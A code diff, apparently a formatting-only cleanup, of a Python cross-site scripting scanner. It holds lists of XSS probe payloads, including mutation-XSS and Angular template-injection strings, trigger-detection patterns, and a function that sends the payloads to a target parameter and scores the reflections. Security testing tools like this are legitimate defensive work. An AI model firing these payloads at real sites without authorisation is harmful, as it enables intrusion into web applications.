@@ -17,20 +17,20 @@ POLYGLOT_PAYLOADS = [
     '"><svg onload=alert(1)>',
     "'-alert(1)-'",
     '\\";alert(1);//',
-    '<script>alert(1)</script>',
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-    '<body onload=alert(1)>',
-    '<input autofocus onfocus=alert(1)>',
-    '<details open ontoggle=alert(1)>',
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<details open ontoggle=alert(1)>",
     '{{constructor.constructor("alert(1)")()}}',
 ]
 
 MUTATION_XSS_PAYLOADS = [
     '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
-    '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>',
-    '<svg><p><style><img src=x onerror=alert(1)>',
-    '<select><style></select><img src=x onerror=alert(1)>',
+    "<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>",
+    "<svg><p><style><img src=x onerror=alert(1)>",
+    "<select><style></select><img src=x onerror=alert(1)>",
 ]
 
 DOM_SINK_PATTERNS = [
@@ -59,11 +59,20 @@ CONTEXT_TO_PAYLOAD_KEY = {
     "json": "json",
 }
 
-XSS_TRIGGER_PATTERNS = ["alert(1)", "onerror=", "onload=", "onfocus=",
-                         "ontoggle=", "onmouseover=", "prompt(", "confirm("]
+XSS_TRIGGER_PATTERNS = [
+    "alert(1)",
+    "onerror=",
+    "onload=",
+    "onfocus=",
+    "ontoggle=",
+    "onmouseover=",
+    "prompt(",
+    "confirm(",
+]
 
 try:
     from tools.xss_browser_verify import check as browser_verify
+
     HAS_BROWSER_VERIFY = True
 except Exception:
     browser_verify = None
@@ -96,9 +105,9 @@ def _is_in_html_context(html: str, marker: str, payload: str) -> bool:
     idx = html.find(marker)
     if idx < 0:
         return False
-    before = html[max(0, idx - 100):idx]
-    in_script = before.lower().rfind('<script') > before.lower().rfind('</script')
-    in_html_tag = '<' in before.split('>')[-1] if '>' in before else '<' in before
+    before = html[max(0, idx - 100) : idx]
+    in_script = before.lower().rfind("<script") > before.lower().rfind("</script")
+    in_html_tag = "<" in before.split(">")[-1] if ">" in before else "<" in before
     if in_script and not in_html_tag:
         return False
     return True
@@ -123,15 +132,16 @@ def _check_dom_sink(html: str, payload: str) -> bool:
     idx = html.find(payload)
     if idx < 0:
         return False
-    before = html[max(0, idx - 500):idx].lower()
+    before = html[max(0, idx - 500) : idx].lower()
     for sink in DOM_SINK_PATTERNS:
         if sink in before:
             return True
     return False
 
 
-def _detect_stored_xss(url: str, param: str, sess: requests.Session,
-                       timeout: float, payload: str, marker: str) -> bool:
+def _detect_stored_xss(
+    url: str, param: str, sess: requests.Session, timeout: float, payload: str, marker: str
+) -> bool:
     base = url.rstrip("/")
     test_val = marker + payload
     for store_path in STORE_AND_FETCH_PATHS:
@@ -145,15 +155,30 @@ def _detect_stored_xss(url: str, param: str, sess: requests.Session,
     return False
 
 
-def check(url: str, param: str, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
-          context: str = "all", waf_name: Optional[str] = None) -> dict:
+def check(
+    url: str,
+    param: str,
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+    post_body: bool = False,
+    post_data: dict = None,
+    context: str = "all",
+    waf_name: Optional[str] = None,
+) -> dict:
     if sess is None:
         sess = requests.Session()
         sess.verify = settings.verify_ssl
-    result = {"vulnerable": False, "type": None, "evidence": [], "confirmed": False,
-              "vector": None, "needs_browser_verify": False, "confidence": "low",
-              "confidence_score": 0.0, "confidence_votes": []}
+    result = {
+        "vulnerable": False,
+        "type": None,
+        "evidence": [],
+        "confirmed": False,
+        "vector": None,
+        "needs_browser_verify": False,
+        "confidence": "low",
+        "confidence_score": 0.0,
+        "confidence_votes": [],
+    }
 
     profiler = ResponseProfiler()
     baseline = profiler.profile_endpoint(url, param, sess, timeout)
@@ -168,9 +193,14 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
         else:
             result["evidence"].append("context:not_reflected")
 
-    payload_ctx_key = CONTEXT_TO_PAYLOAD_KEY.get(detected_ctx, "html") if detected_ctx != "all" else None
-    contexts_to_try = [payload_ctx_key] if payload_ctx_key else [
-        "html", "attr", "js", "angular", "json", "comment"]
+    payload_ctx_key = (
+        CONTEXT_TO_PAYLOAD_KEY.get(detected_ctx, "html") if detected_ctx != "all" else None
+    )
+    contexts_to_try = (
+        [payload_ctx_key]
+        if payload_ctx_key
+        else ["html", "attr", "js", "angular", "json", "comment"]
+    )
 
     confirmed_count = 0
     total_tried = 0
@@ -190,14 +220,18 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                 else:
                     r = sess.get(build_url(url, param, test_payload), timeout=timeout)
 
-                if (marker in r.text
-                        and _payload_reflected_unescaped(r.text, payload)
-                        and _attr_breakout_ok(payload, detected_ctx)):
+                if (
+                    marker in r.text
+                    and _payload_reflected_unescaped(r.text, payload)
+                    and _attr_breakout_ok(payload, detected_ctx)
+                ):
                     confirmed_count += 1
                     result["vulnerable"] = True
                     result["type"] = "reflected_%s" % ctx
                     result["vector"] = payload[:80]
-                    result["evidence"].append("reflected %s in %s (%dB)" % (ctx, param, len(r.text)))
+                    result["evidence"].append(
+                        "reflected %s in %s (%dB)" % (ctx, param, len(r.text))
+                    )
 
                     if _has_unescaped_trigger(r.text):
                         result["confirmed"] = True
@@ -206,7 +240,9 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                     if baseline:
                         report = profiler.analyze(url, param, r)
                         if report.is_anomalous:
-                            result["evidence"].append("response_anomaly: %s" % "; ".join(report.reasons))
+                            result["evidence"].append(
+                                "response_anomaly: %s" % "; ".join(report.reasons)
+                            )
 
                     if confirmed_count >= 2:
                         break
